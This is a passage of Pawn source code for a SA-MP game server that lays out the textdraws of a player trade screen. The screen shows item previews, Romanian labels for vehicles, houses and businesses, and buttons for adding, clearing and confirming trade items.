	PlayerTextDrawSetShadow(playerid, TradeTD[2], 0);
	PlayerTextDrawSetPreviewModel(playerid, TradeTD[2], 292);
	PlayerTextDrawSetPreviewRot(playerid, TradeTD[2], 0.000000, 0.000000, 30.000000, 1.000000);

	TradeTD[3] = CreatePlayerTextDraw(playerid, 413.000000, 113.466705, "");
	PlayerTextDrawLetterSize(playerid, TradeTD[3], 0.000000, 0.000000);
	PlayerTextDrawTextSize(playerid, TradeTD[3], 122.000000, 70.000000);
	PlayerTextDrawAlignment(playerid, TradeTD[3], 1);
	PlayerTextDrawColor(playerid, TradeTD[3], -1);
	PlayerTextDrawSetShadow(playerid, TradeTD[3], 0);
	PlayerTextDrawSetOutline(playerid, TradeTD[3], 0);
	PlayerTextDrawBackgroundColor(playerid, TradeTD[3], 0);
	PlayerTextDrawFont(playerid, TradeTD[3], 5);
	PlayerTextDrawSetProportional(playerid, TradeTD[3], 0);
	PlayerTextDrawSetShadow(playerid, TradeTD[3], 0);
	PlayerTextDrawSetPreviewModel(playerid, TradeTD[3], 292);
	PlayerTextDrawSetPreviewRot(playerid, TradeTD[3], 0.000000, 0.000000, 320.000000, 1.000000);

	TradeTD[4] = CreatePlayerTextDraw(playerid, 159.000000, 120.466697, "Deathwing.~n~~g~Prepared");
	PlayerTextDrawLetterSize(playerid, TradeTD[4], 0.282000, 1.184666);
	PlayerTextDrawAlignment(playerid, TradeTD[4], 1);
	PlayerTextDrawColor(playerid, TradeTD[4], -1);
	PlayerTextDrawSetShadow(playerid, TradeTD[4], 0);
	PlayerTextDrawSetOutline(playerid, TradeTD[4], 0);
	PlayerTextDrawBackgroundColor(playerid, TradeTD[4], 255);
	PlayerTextDrawFont(playerid, TradeTD[4], 1);
	PlayerTextDrawSetProportional(playerid, TradeTD[4], 1);
	PlayerTextDrawSetShadow(playerid, TradeTD[4], 0);

	TradeTD[5] = CreatePlayerTextDraw(playerid, 460.500000, 120.000007, "AdmBot~n~~r~Prepared");
	PlayerTextDrawLetterSize(playerid, TradeTD[5], 0.282000, 1.184666);
	PlayerTextDrawAlignment(playerid, TradeTD[5], 3);
	PlayerTextDrawColor(playerid, TradeTD[5], -1);
	PlayerTextDrawSetShadow(playerid, TradeTD[5], 0);
	PlayerTextDrawSetOutline(playerid, TradeTD[5], 0);
	PlayerTextDrawBackgroundColor(playerid, TradeTD[5], 255);
	PlayerTextDrawFont(playerid, TradeTD[5], 1);
	PlayerTextDrawSetProportional(playerid, TradeTD[5], 1);
	PlayerTextDrawSetShadow(playerid, TradeTD[5], 0);

	TradeTD[6] = CreatePlayerTextDraw(playerid, 297.399963, 117.933334, "LD_SPAC:white");
	PlayerTextDrawLetterSize(playerid, TradeTD[6], 0.000000, 0.000000);
	PlayerTextDrawTextSize(playerid, TradeTD[6], 16.000000, 249.369247);
	PlayerTextDrawAlignment(playerid, TradeTD[6], 1);
	PlayerTextDrawColor(playerid, TradeTD[6], 505290495);
	PlayerTextDrawSetShadow(playerid, TradeTD[6], 0);
	PlayerTextDrawSetOutline(playerid, TradeTD[6], 0);
	PlayerTextDrawBackgroundColor(playerid, TradeTD[6], 255);
	PlayerTextDrawFont(playerid, TradeTD[6], 4);
	PlayerTextDrawSetProportional(playerid, TradeTD[6], 0);
	PlayerTextDrawSetShadow(playerid, TradeTD[6], 0);

	TradeTD[7] = CreatePlayerTextDraw(playerid, 144.399597, 366.733154, "ADD_ITEMS");
	PlayerTextDrawLetterSize(playerid, TradeTD[7], 0.222000, 0.825333);
	PlayerTextDrawTextSize(playerid, TradeTD[7], 20.0, 20.0);
	PlayerTextDrawAlignment(playerid, TradeTD[7], 2);
	PlayerTextDrawColor(playerid, TradeTD[7], -1);
	PlayerTextDrawSetShadow(playerid, TradeTD[7], 0);
	PlayerTextDrawSetOutline(playerid, TradeTD[7], 0);
	PlayerTextDrawBackgroundColor(playerid, TradeTD[7], 255);
	PlayerTextDrawFont(playerid, TradeTD[7], 2);
	PlayerTextDrawSetProportional(playerid, TradeTD[7], 1);
	PlayerTextDrawSetShadow(playerid, TradeTD[7], 0);
	PlayerTextDrawSetSelectable(playerid, TradeTD[7], true);

	TradeTD[8] = CreatePlayerTextDraw(playerid, 449.899597, 367.166473, "Clear_all_items");
	PlayerTextDrawLetterSize(playerid, TradeTD[8], 0.222000, 0.825333);
	PlayerTextDrawTextSize(playerid, TradeTD[8], 20.0, 20.0);
	PlayerTextDrawAlignment(playerid, TradeTD[8], 2);
	PlayerTextDrawColor(playerid, TradeTD[8], -1);
	PlayerTextDrawSetShadow(playerid, TradeTD[8], 0);
	PlayerTextDrawSetOutline(playerid, TradeTD[8], 0);
	PlayerTextDrawBackgroundColor(playerid, TradeTD[8], 255);
	PlayerTextDrawFont(playerid, TradeTD[8], 2);
	PlayerTextDrawSetProportional(playerid, TradeTD[8], 1);
	PlayerTextDrawSetShadow(playerid, TradeTD[8], 0);
	PlayerTextDrawSetSelectable(playerid, TradeTD[8], true);

	TradeTD[9] = CreatePlayerTextDraw(playerid, 304.399597, 367.166442, "Prepared");
	PlayerTextDrawLetterSize(playerid, TradeTD[9], 0.222000, 0.825333);
	PlayerTextDrawTextSize(playerid, TradeTD[9], 20.0, 20.0);
	PlayerTextDrawAlignment(playerid, TradeTD[9], 2);
	PlayerTextDrawColor(playerid, TradeTD[9], -1);
	PlayerTextDrawSetShadow(playerid, TradeTD[9], 0);
	PlayerTextDrawSetOutline(playerid, TradeTD[9], 0);
	PlayerTextDrawBackgroundColor(playerid, TradeTD[9], 255);
	PlayerTextDrawFont(playerid, TradeTD[9], 2);
	PlayerTextDrawSetProportional(playerid, TradeTD[9], 1);
	PlayerTextDrawSetShadow(playerid, TradeTD[9], 0);
	PlayerTextDrawSetSelectable(playerid, TradeTD[9], true);

	TradeTD[10] = CreatePlayerTextDraw(playerid, 230.499542, 199.566741, "Infernus_(KM:_10,_Vechime:_3_zile)");
	PlayerTextDrawLetterSize(playerid, TradeTD[10], 0.169999, 0.564000);
	PlayerTextDrawTextSize(playerid, TradeTD[10], 0.000000, 124.000000);
	PlayerTextDrawAlignment(playerid, TradeTD[10], 2);
	PlayerTextDrawColor(playerid, TradeTD[10], -1);
	PlayerTextDrawUseBox(playerid, TradeTD[10], 1);
	PlayerTextDrawBoxColor(playerid, TradeTD[10], 505290495);
	PlayerTextDrawSetShadow(playerid, TradeTD[10], 0);
	PlayerTextDrawSetOutline(playerid, TradeTD[10], 0);
	PlayerTextDrawBackgroundColor(playerid, TradeTD[10], -1);
	PlayerTextDrawFont(playerid, TradeTD[10], 2);
	PlayerTextDrawSetProportional(playerid, TradeTD[10], 1);
	PlayerTextDrawSetShadow(playerid, TradeTD[10], 0);

	TradeTD[11] = CreatePlayerTextDraw(playerid, 118.000000, 184.399902, "");
	PlayerTextDrawLetterSize(playerid, TradeTD[11], 0.000000, 0.000000);
	PlayerTextDrawTextSize(playerid, TradeTD[11], 53.000000, 22.000000);
	PlayerTextDrawAlignment(playerid, TradeTD[11], 1);
	PlayerTextDrawColor(playerid, TradeTD[11], -1);
	PlayerTextDrawSetShadow(playerid, TradeTD[11], 0);
	PlayerTextDrawSetOutline(playerid, TradeTD[11], 0);
	PlayerTextDrawBackgroundColor(playerid, TradeTD[11], 505290495);
	PlayerTextDrawFont(playerid, TradeTD[11], 5);
	PlayerTextDrawSetProportional(playerid, TradeTD[11], 0);
	PlayerTextDrawSetShadow(playerid, TradeTD[11], 0);
	PlayerTextDrawSetPreviewModel(playerid, TradeTD[11], 411);
	PlayerTextDrawSetPreviewRot(playerid, TradeTD[11], 0.000000, 0.000000, 30.000000, 1.000000);
	PlayerTextDrawSetPreviewVehCol(playerid, TradeTD[11], 1, 1);

	TradeTD[12] = CreatePlayerTextDraw(playerid, 117.200019, 207.767959, "");
	PlayerTextDrawLetterSize(playerid, TradeTD[12], 0.000000, 0.000000);
	PlayerTextDrawTextSize(playerid, TradeTD[12], 53.000000, 22.000000);
	PlayerTextDrawAlignment(playerid, TradeTD[12], 1);
	PlayerTextDrawColor(playerid, TradeTD[12], -1);
	PlayerTextDrawSetShadow(playerid, TradeTD[12], 0);
	PlayerTextDrawSetOutline(playerid, TradeTD[12], 0);
	PlayerTextDrawBackgroundColor(playerid, TradeTD[12], 505290495);
	PlayerTextDrawFont(playerid, TradeTD[12], 5);
	PlayerTextDrawSetProportional(playerid, TradeTD[12], 0);
	PlayerTextDrawSetShadow(playerid, TradeTD[12], 0);
	PlayerTextDrawSetPreviewModel(playerid, TradeTD[12], 1273);
	PlayerTextDrawSetPreviewRot(playerid, TradeTD[12], 0.000000, 0.000000, 30.000000, 1.000000);

	TradeTD[13] = CreatePlayerTextDraw(playerid, 230.499542, 222.768157, "CASA_ID:_1");
	PlayerTextDrawLetterSize(playerid, TradeTD[13], 0.169999, 0.564000);
	PlayerTextDrawTextSize(playerid, TradeTD[13], 0.000000, 124.000000);
	PlayerTextDrawAlignment(playerid, TradeTD[13], 2);
	PlayerTextDrawColor(playerid, TradeTD[13], -1);
	PlayerTextDrawUseBox(playerid, TradeTD[13], 1);
	PlayerTextDrawBoxColor(playerid, TradeTD[13], 505290495);
	PlayerTextDrawSetShadow(playerid, TradeTD[13], 0);
	PlayerTextDrawSetOutline(playerid, TradeTD[13], 0);
	PlayerTextDrawBackgroundColor(playerid, TradeTD[13], -1);
	PlayerTextDrawFont(playerid, TradeTD[13], 2);
	PlayerTextDrawSetProportional(playerid, TradeTD[13], 1);
	PlayerTextDrawSetShadow(playerid, TradeTD[13], 0);

	TradeTD[14] = CreatePlayerTextDraw(playerid, 117.200019, 231.069381, "");
	PlayerTextDrawLetterSize(playerid, TradeTD[14], 0.000000, 0.000000);
	PlayerTextDrawTextSize(playerid, TradeTD[14], 53.000000, 22.000000);
	PlayerTextDrawAlignment(playerid, TradeTD[14], 1);
	PlayerTextDrawColor(playerid, TradeTD[14], -1);
	PlayerTextDrawSetShadow(playerid, TradeTD[14], 0);
	PlayerTextDrawSetOutline(playerid, TradeTD[14], 0);
	PlayerTextDrawBackgroundColor(playerid, TradeTD[14], 505290495);
	PlayerTextDrawFont(playerid, TradeTD[14], 5);
	PlayerTextDrawSetProportional(playerid, TradeTD[14], 0);
	PlayerTextDrawSetShadow(playerid, TradeTD[14], 0);
	PlayerTextDrawSetPreviewModel(playerid, TradeTD[14], 1274);
	PlayerTextDrawSetPreviewRot(playerid, TradeTD[14], 0.000000, 0.000000, 30.000000, 1.000000);

	TradeTD[15] = CreatePlayerTextDraw(playerid, 230.999542, 246.168075, "Afacere_ID:_1");
	PlayerTextDrawLetterSize(playerid, TradeTD[15], 0.169999, 0.564000);
	PlayerTextDrawTextSize(playerid, TradeTD[15], 0.000000, 124.000000);
	PlayerTextDrawAlignment(playerid, TradeTD[15], 2);
	PlayerTextDrawColor(playerid, TradeTD[15], -1);
	PlayerTextDrawUseBox(playerid, TradeTD[15], 1);
	PlayerTextDrawBoxColor(playerid, TradeTD[15], 505290495);
	PlayerTextDrawSetShadow(playerid, TradeTD[15], 0);
	PlayerTextDrawSetOutline(playerid, TradeTD[15], 0);
	PlayerTextDrawBackgroundColor(playerid, TradeTD[15], -1);
	PlayerTextDrawFont(playerid, TradeTD[15], 2);
	PlayerTextDrawSetProportional(playerid, TradeTD[15], 1);
	PlayerTextDrawSetShadow(playerid, TradeTD[15], 0);

	TradeTD[16] = CreatePlayerTextDraw(playerid, 117.200019, 255.170852, "");
	PlayerTextDrawLetterSize(playerid, TradeTD[16], 0.000000, 0.000000);
	PlayerTextDrawTextSize(playerid, TradeTD[16], 53.000000, 22.000000);
	PlayerTextDrawAlignment(playerid, TradeTD[16], 1);
	PlayerTextDrawColor(playerid, TradeTD[16], -1);
	PlayerTextDrawSetShadow(playerid, TradeTD[16], 0);
	PlayerTextDrawSetOutline(playerid, TradeTD[16], 0);
	PlayerTextDrawBackgroundColor(playerid, TradeTD[16], 505290495);
	PlayerTextDrawFont(playerid, TradeTD[16], 5);
	PlayerTextDrawSetProportional(playerid, TradeTD[16], 0);
	PlayerTextDrawSetShadow(playerid, TradeTD[16], 0);
	PlayerTextDrawSetPreviewModel(playerid, TradeTD[16], 1212);
	PlayerTextDrawSetPreviewRot(playerid, TradeTD[16], 90.000000, 0.000000, 90.000000, 1.000000);

	TradeTD[17] = CreatePlayerTextDraw(playerid, 229.299591, 269.968017, "$1,000,000,000");
	PlayerTextDrawLetterSize(playerid, TradeTD[17], 0.169999, 0.564000);
	PlayerTextDrawTextSize(playerid, TradeTD[17], 0.000000, 124.000000);
	PlayerTextDrawAlignment(playerid, TradeTD[17], 2);
	PlayerTextDrawColor(playerid, TradeTD[17], -1);
	PlayerTextDrawUseBox(playerid, TradeTD[17], 1);
	PlayerTextDrawBoxColor(playerid, TradeTD[17], 505290495);
	PlayerTextDrawSetShadow(playerid, TradeTD[17], 0);
	PlayerTextDrawSetOutline(playerid, TradeTD[17], 0);
	PlayerTextDrawBackgroundColor(playerid, TradeTD[17], -1);
	PlayerTextDrawFont(playerid, TradeTD[17], 2);
	PlayerTextDrawSetProportional(playerid, TradeTD[17], 1);
	PlayerTextDrawSetShadow(playerid, TradeTD[17], 0);

	TradeTD[18] = CreatePlayerTextDraw(playerid, 116.899993, 279.033111, "");
	PlayerTextDrawLetterSize(playerid, TradeTD[18], 0.000000, 0.000000);
	PlayerTextDrawTextSize(playerid, TradeTD[18], 53.000000, 22.000000);
	PlayerTextDrawAlignment(playerid, TradeTD[18], 1);
	PlayerTextDrawColor(playerid, TradeTD[18], -1);
	PlayerTextDrawSetShadow(playerid, TradeTD[18], 0);
	PlayerTextDrawSetOutline(playerid, TradeTD[18], 0);
	PlayerTextDrawBackgroundColor(playerid, TradeTD[18], 505290495);
	PlayerTextDrawFont(playerid, TradeTD[18], 5);
	PlayerTextDrawSetProportional(playerid, TradeTD[18], 0);
	PlayerTextDrawSetShadow(playerid, TradeTD[18], 0);
	PlayerTextDrawSetPreviewModel(playerid, TradeTD[18], 562);
	PlayerTextDrawSetPreviewRot(playerid, TradeTD[18], 0.000000, 0.000000, 30.000000, 1.000000);
	PlayerTextDrawSetPreviewVehCol(playerid, TradeTD[18], 1, 1);

	TradeTD[19] = CreatePlayerTextDraw(playerid, 116.799964, 302.901153, "");
	PlayerTextDrawLetterSize(playerid, TradeTD[19], 0.000000, 0.000000);
	PlayerTextDrawTextSize(playerid, TradeTD[19], 53.000000, 22.000000);
	PlayerTextDrawAlignment(playerid, TradeTD[19], 1);
	PlayerTextDrawColor(playerid, TradeTD[19], -1);
	PlayerTextDrawSetShadow(playerid, TradeTD[19], 0);
	PlayerTextDrawSetOutline(playerid, TradeTD[19], 0);
	PlayerTextDrawBackgroundColor(playerid, TradeTD[19], 505290495);
	PlayerTextDrawFont(playerid, TradeTD[19], 5);
	PlayerTextDrawSetProportional(playerid, TradeTD[19], 0);
	PlayerTextDrawSetShadow(playerid, TradeTD[19], 0);
	PlayerTextDrawSetPreviewModel(playerid, TradeTD[19], 560);
	PlayerTextDrawSetPreviewRot(playerid, TradeTD[19], 0.000000, 0.000000, 30.000000, 1.000000);
	PlayerTextDrawSetPreviewVehCol(playerid, TradeTD[19], 1, 1);

	TradeTD[20] = CreatePlayerTextDraw(playerid, 229.599517, 294.433227, "Elegy_(KM:_5,_Vechime:_2_zile)");
	PlayerTextDrawLetterSize(playerid, TradeTD[20], 0.169999, 0.564000);
	PlayerTextDrawTextSize(playerid, TradeTD[20], 0.000000, 124.000000);
	PlayerTextDrawAlignment(playerid, TradeTD[20], 2);
	PlayerTextDrawColor(playerid, TradeTD[20], -1);
	PlayerTextDrawUseBox(playerid, TradeTD[20], 1);
	PlayerTextDrawBoxColor(playerid, TradeTD[20], 505290495);
	PlayerTextDrawSetShadow(playerid, TradeTD[20], 0);
	PlayerTextDrawSetOutline(playerid, TradeTD[20], 0);
	PlayerTextDrawBackgroundColor(playerid, TradeTD[20], -1);
	PlayerTextDrawFont(playerid, TradeTD[20], 2);
	PlayerTextDrawSetProportional(playerid, TradeTD[20], 1);
	PlayerTextDrawSetShadow(playerid, TradeTD[20], 0);

	TradeTD[21] = CreatePlayerTextDraw(playerid, 229.599517, 317.934661, "Sultan_(KM:_50,_Vechime:_5_zile)");
	PlayerTextDrawLetterSize(playerid, TradeTD[21], 0.169999, 0.564000);
	PlayerTextDrawTextSize(playerid, TradeTD[21], 0.000000, 124.000000);
	PlayerTextDrawAlignment(playerid, TradeTD[21], 2);
	PlayerTextDrawColor(playerid, TradeTD[21], -1);
	PlayerTextDrawUseBox(playerid, TradeTD[21], 1);
	PlayerTextDrawBoxColor(playerid, TradeTD[21], 505290495);
	PlayerTextDrawSetShadow(playerid, TradeTD[21], 0);
	PlayerTextDrawSetOutline(playerid, TradeTD[21], 0);
	PlayerTextDrawBackgroundColor(playerid, TradeTD[21], -1);
	PlayerTextDrawFont(playerid, TradeTD[21], 2);
	PlayerTextDrawSetProportional(playerid, TradeTD[21], 1);
	PlayerTextDrawSetShadow(playerid, TradeTD[21], 0);

	TradeTD[22] = CreatePlayerTextDraw(playerid, 116.700012, 326.801452, "");
	PlayerTextDrawLetterSize(playerid, TradeTD[22], 0.000000, 0.000000);
	PlayerTextDrawTextSize(playerid, TradeTD[22], 53.000000, 22.000000);
	PlayerTextDrawAlignment(playerid, TradeTD[22], 1);
	PlayerTextDrawColor(playerid, TradeTD[22], -1);
	PlayerTextDrawSetShadow(playerid, TradeTD[22], 0);
	PlayerTextDrawSetOutline(playerid, TradeTD[22], 0);
	PlayerTextDrawBackgroundColor(playerid, TradeTD[22], 505290495);
	PlayerTextDrawFont(playerid, TradeTD[22], 5);
	PlayerTextDrawSetProportional(playerid, TradeTD[22], 0);
	PlayerTextDrawSetShadow(playerid, TradeTD[22], 0);
	PlayerTextDrawSetPreviewModel(playerid, TradeTD[22], 1273);
	PlayerTextDrawSetPreviewRot(playerid, TradeTD[22], 0.000000, 0.000000, 30.000000, 1.000000);

	TradeTD[23] = CreatePlayerTextDraw(playerid, 229.999542, 341.768096, "CASA_ID:_2");
	PlayerTextDrawLetterSize(playerid, TradeTD[23], 0.169999, 0.564000);
	PlayerTextDrawTextSize(playerid, TradeTD[23], 0.000000, 124.000000);
	PlayerTextDrawAlignment(playerid, TradeTD[23], 2);
	PlayerTextDrawColor(playerid, TradeTD[23], -1);
	PlayerTextDrawUseBox(playerid, TradeTD[23], 1);
	PlayerTextDrawBoxColor(playerid, TradeTD[23], 505290495);
	PlayerTextDrawSetShadow(playerid, TradeTD[23], 0);
	PlayerTextDrawSetOutline(playerid, TradeTD[23], 0);
	PlayerTextDrawBackgroundColor(playerid, TradeTD[23], -1);
	PlayerTextDrawFont(playerid, TradeTD[23], 2);
	PlayerTextDrawSetProportional(playerid, TradeTD[23], 1);
	PlayerTextDrawSetShadow(playerid, TradeTD[23], 0);

	TradeTD[24] = CreatePlayerTextDraw(playerid, 446.611602, 184.533081, "");
	PlayerTextDrawLetterSize(playerid, TradeTD[24], 0.000000, 0.000000);
	PlayerTextDrawTextSize(playerid, TradeTD[24], 53.000000, 22.000000);
	PlayerTextDrawAlignment(playerid, TradeTD[24], 1);
	PlayerTextDrawColor(playerid, TradeTD[24], -1);
	PlayerTextDrawSetShadow(playerid, TradeTD[24], 0);
	PlayerTextDrawSetOutline(playerid, TradeTD[24], 0);
	PlayerTextDrawBackgroundColor(playerid, TradeTD[24], 505290495);
	PlayerTextDrawFont(playerid, TradeTD[24], 5);
	PlayerTextDrawSetProportional(playerid, TradeTD[24], 0);
	PlayerTextDrawSetShadow(playerid, TradeTD[24], 0);
	PlayerTextDrawSetPreviewModel(playerid, TradeTD[24], 451);
	PlayerTextDrawSetPreviewRot(playerid, TradeTD[24], 0.000000, 0.000000, 320.000000, 1.000000);
	PlayerTextDrawSetPreviewVehCol(playerid, TradeTD[24], 1, 1);

	TradeTD[25] = CreatePlayerTextDraw(playerid, 383.499542, 199.366729, "Turismo_(KM:_5,_Vechime:_2_Zile)");
	PlayerTextDrawLetterSize(playerid, TradeTD[25], 0.169999, 0.564000);
	PlayerTextDrawTextSize(playerid, TradeTD[25], 0.000000, 124.000000);
	PlayerTextDrawAlignment(playerid, TradeTD[25], 2);
	PlayerTextDrawColor(playerid, TradeTD[25], -1);
	PlayerTextDrawUseBox(playerid, TradeTD[25], 1);
	PlayerTextDrawBoxColor(playerid, TradeTD[25], 505290495);
	PlayerTextDrawSetShadow(playerid, TradeTD[25], 0);
	PlayerTextDrawSetOutline(playerid, TradeTD[25], 0);
	PlayerTextDrawBackgroundColor(playerid, TradeTD[25], -1);
	PlayerTextDrawFont(playerid, TradeTD[25], 2);
	PlayerTextDrawSetProportional(playerid, TradeTD[25], 1);
	PlayerTextDrawSetShadow(playerid, TradeTD[25], 0);

	TradeTD[26] = CreatePlayerTextDraw(playerid, 446.611602, 208.434539, "");
	PlayerTextDrawLetterSize(playerid, TradeTD[26], 0.000000, 0.000000);
	PlayerTextDrawTextSize(playerid, TradeTD[26], 53.000000, 22.000000);
	PlayerTextDrawAlignment(playerid, TradeTD[26], 1);
	PlayerTextDrawColor(playerid, TradeTD[26], -1);
	PlayerTextDrawSetShadow(playerid, TradeTD[26], 0);
	PlayerTextDrawSetOutline(playerid, TradeTD[26], 0);
	PlayerTextDrawBackgroundColor(playerid, TradeTD[26], 505290495);
	PlayerTextDrawFont(playerid, TradeTD[26], 5);
	PlayerTextDrawSetProportional(playerid, TradeTD[26], 0);
	PlayerTextDrawSetShadow(playerid, TradeTD[26], 0);
	PlayerTextDrawSetPreviewModel(playerid, TradeTD[26], 1273);
	PlayerTextDrawSetPreviewRot(playerid, TradeTD[26], 0.000000, 0.000000, 320.000000, 1.000000);

	TradeTD[27] = CreatePlayerTextDraw(playerid, 446.611602, 232.736022, "");
	PlayerTextDrawLetterSize(playerid, TradeTD[27], 0.000000, 0.000000);
	PlayerTextDrawTextSize(playerid, TradeTD[27], 53.000000, 22.000000);
	PlayerTextDrawAlignment(playerid, TradeTD[27], 1);
	PlayerTextDrawColor(playerid, TradeTD[27], -1);
	PlayerTextDrawSetShadow(playerid, TradeTD[27], 0);
	PlayerTextDrawSetOutline(playerid, TradeTD[27], 0);
	PlayerTextDrawBackgroundColor(playerid, TradeTD[27], 505290495);
	PlayerTextDrawFont(playerid, TradeTD[27], 5);
	PlayerTextDrawSetProportional(playerid, TradeTD[27], 0);
	PlayerTextDrawSetShadow(playerid, TradeTD[27], 0);
	PlayerTextDrawSetPreviewModel(playerid, TradeTD[27], 1274);
	PlayerTextDrawSetPreviewRot(playerid, TradeTD[27], 0.000000, 0.000000, 320.000000, 1.000000);

	TradeTD[28] = CreatePlayerTextDraw(playerid, 446.511688, 257.437530, "");
	PlayerTextDrawLetterSize(playerid, TradeTD[28], 0.000000, 0.000000);
	PlayerTextDrawTextSize(playerid, TradeTD[28], 53.000000, 22.000000);
	PlayerTextDrawAlignment(playerid, TradeTD[28], 1);
	PlayerTextDrawColor(playerid, TradeTD[28], -1);
	PlayerTextDrawSetShadow(playerid, TradeTD[28], 0);
	PlayerTextDrawSetOutline(playerid, TradeTD[28], 0);
	PlayerTextDrawBackgroundColor(playerid, TradeTD[28], 505290495);
	PlayerTextDrawFont(playerid, TradeTD[28], 5);
	PlayerTextDrawSetProportional(playerid, TradeTD[28], 0);
	PlayerTextDrawSetShadow(playerid, TradeTD[28], 0);
	PlayerTextDrawSetPreviewModel(playerid, TradeTD[28], 1212);
	PlayerTextDrawSetPreviewRot(playerid, TradeTD[28], 90.000000, 0.000000, 90.000000, 1.000000);

	TradeTD[29] = CreatePlayerTextDraw(playerid, 446.611602, 282.039031, "");
	PlayerTextDrawLetterSize(playerid, TradeTD[29], 0.000000, 0.000000);
	PlayerTextDrawTextSize(playerid, TradeTD[29], 53.000000, 22.000000);
	PlayerTextDrawAlignment(playerid, TradeTD[29], 1);
	PlayerTextDrawColor(playerid, TradeTD[29], -1);
	PlayerTextDrawSetShadow(playerid, TradeTD[29], 0);
	PlayerTextDrawSetOutline(playerid, TradeTD[29], 0);
	PlayerTextDrawBackgroundColor(playerid, TradeTD[29], 505290495);
	PlayerTextDrawFont(playerid, TradeTD[29], 5);
	PlayerTextDrawSetProportional(playerid, TradeTD[29], 0);
	PlayerTextDrawSetShadow(playerid, TradeTD[29], 0);
	PlayerTextDrawSetPreviewModel(playerid, TradeTD[29], 541);
	PlayerTextDrawSetPreviewRot(playerid, TradeTD[29], 0.000000, 0.000000, 320.000000, 1.000000);
	PlayerTextDrawSetPreviewVehCol(playerid, TradeTD[29], 1, 1);

	TradeTD[30] = CreatePlayerTextDraw(playerid, 446.611602, 306.940551, "");
	PlayerTextDrawLetterSize(playerid, TradeTD[30], 0.000000, 0.000000);
	PlayerTextDrawTextSize(playerid, TradeTD[30], 53.000000, 22.000000);
	PlayerTextDrawAlignment(playerid, TradeTD[30], 1);
	PlayerTextDrawColor(playerid, TradeTD[30], -1);
	PlayerTextDrawSetShadow(playerid, TradeTD[30], 0);
	PlayerTextDrawSetOutline(playerid, TradeTD[30], 0);
	PlayerTextDrawBackgroundColor(playerid, TradeTD[30], 505290495);
	PlayerTextDrawFont(playerid, TradeTD[30], 5);
	PlayerTextDrawSetProportional(playerid, TradeTD[30], 0);
	PlayerTextDrawSetShadow(playerid, TradeTD[30], 0);
	PlayerTextDrawSetPreviewModel(playerid, TradeTD[30], 522);
	PlayerTextDrawSetPreviewRot(playerid, TradeTD[30], 0.000000, 0.000000, 320.000000, 1.000000);
	PlayerTextDrawSetPreviewVehCol(playerid, TradeTD[30], 1, 1);

	TradeTD[31] = CreatePlayerTextDraw(playerid, 446.611602, 331.042022, "");
	PlayerTextDrawLetterSize(playerid, TradeTD[31], 0.000000, 0.000000);
	PlayerTextDrawTextSize(playerid, TradeTD[31], 53.000000, 22.000000);
	PlayerTextDrawAlignment(playerid, TradeTD[31], 1);
	PlayerTextDrawColor(playerid, TradeTD[31], -1);
	PlayerTextDrawSetShadow(playerid, TradeTD[31], 0);
	PlayerTextDrawSetOutline(playerid, TradeTD[31], 0);
	PlayerTextDrawBackgroundColor(playerid, TradeTD[31], 505290495);
	PlayerTextDrawFont(playerid, TradeTD[31], 5);
	PlayerTextDrawSetProportional(playerid, TradeTD[31], 0);
	PlayerTextDrawSetShadow(playerid, TradeTD[31], 0);
	PlayerTextDrawSetPreviewModel(playerid, TradeTD[31], 1273);
	PlayerTextDrawSetPreviewRot(playerid, TradeTD[31], 0.000000, 0.000000, 320.000000, 1.000000);

	TradeTD[32] = CreatePlayerTextDraw(playerid, 383.299407, 223.166641, "CASA_ID:3");
	PlayerTextDrawLetterSize(playerid, TradeTD[32], 0.169999, 0.564000);
	PlayerTextDrawTextSize(playerid, TradeTD[32], 0.000000, 124.000000);
	PlayerTextDrawAlignment(playerid, TradeTD[32], 2);
	PlayerTextDrawColor(playerid, TradeTD[32], -1);
	PlayerTextDrawUseBox(playerid, TradeTD[32], 1);
	PlayerTextDrawBoxColor(playerid, TradeTD[32], 505290495);
	PlayerTextDrawSetShadow(playerid, TradeTD[32], 0);
	PlayerTextDrawSetOutline(playerid, TradeTD[32], 0);
	PlayerTextDrawBackgroundColor(playerid, TradeTD[32], -1);
	PlayerTextDrawFont(playerid, TradeTD[32], 2);
	PlayerTextDrawSetProportional(playerid, TradeTD[32], 1);
	PlayerTextDrawSetShadow(playerid, TradeTD[32], 0);

	TradeTD[33] = CreatePlayerTextDraw(playerid, 383.299407, 247.668136, "AFACERE_ID:_2");
	PlayerTextDrawLetterSize(playerid, TradeTD[33], 0.169999, 0.564000);
	PlayerTextDrawTextSize(playerid, TradeTD[33], 0.000000, 124.000000);
	PlayerTextDrawAlignment(playerid, TradeTD[33], 2);
	PlayerTextDrawColor(playerid, TradeTD[33], -1);
	PlayerTextDrawUseBox(playerid, TradeTD[33], 1);
	PlayerTextDrawBoxColor(playerid, TradeTD[33], 505290495);
	PlayerTextDrawSetShadow(playerid, TradeTD[33], 0);
	PlayerTextDrawSetOutline(playerid, TradeTD[33], 0);
	PlayerTextDrawBackgroundColor(playerid, TradeTD[33], -1);
	PlayerTextDrawFont(playerid, TradeTD[33], 2);
	PlayerTextDrawSetProportional(playerid, TradeTD[33], 1);
	PlayerTextDrawSetShadow(playerid, TradeTD[33], 0);

	TradeTD[34] = CreatePlayerTextDraw(playerid, 383.299407, 272.369628, "$1,000,000,000");
	PlayerTextDrawLetterSize(playerid, TradeTD[34], 0.169999, 0.564000);
	PlayerTextDrawTextSize(playerid, TradeTD[34], 0.000000, 124.000000);
	PlayerTextDrawAlignment(playerid, TradeTD[34], 2);
	PlayerTextDrawColor(playerid, TradeTD[34], -1);
	PlayerTextDrawUseBox(playerid, TradeTD[34], 1);
	PlayerTextDrawBoxColor(playerid, TradeTD[34], 505290495);
	PlayerTextDrawSetShadow(playerid, TradeTD[34], 0);
	PlayerTextDrawSetOutline(playerid, TradeTD[34], 0);
	PlayerTextDrawBackgroundColor(playerid, TradeTD[34], -1);
	PlayerTextDrawFont(playerid, TradeTD[34], 2);
	PlayerTextDrawSetProportional(playerid, TradeTD[34], 1);
	PlayerTextDrawSetShadow(playerid, TradeTD[34], 0);
	PlayerTextDrawSetSelectable(playerid, TradeTD[34], true);

	TradeTD[35] = CreatePlayerTextDraw(playerid, 383.299407, 297.071136, "BULLET_(KM:_68,_Vechime:_3_zile)");
	PlayerTextDrawLetterSize(playerid, TradeTD[35], 0.169999, 0.564000);
	PlayerTextDrawTextSize(playerid, TradeTD[35], 0.000000, 124.000000);
	PlayerTextDrawAlignment(playerid, TradeTD[35], 2);
	PlayerTextDrawColor(playerid, TradeTD[35], -1);
	PlayerTextDrawUseBox(playerid, TradeTD[35], 1);
	PlayerTextDrawBoxColor(playerid, TradeTD[35], 505290495);
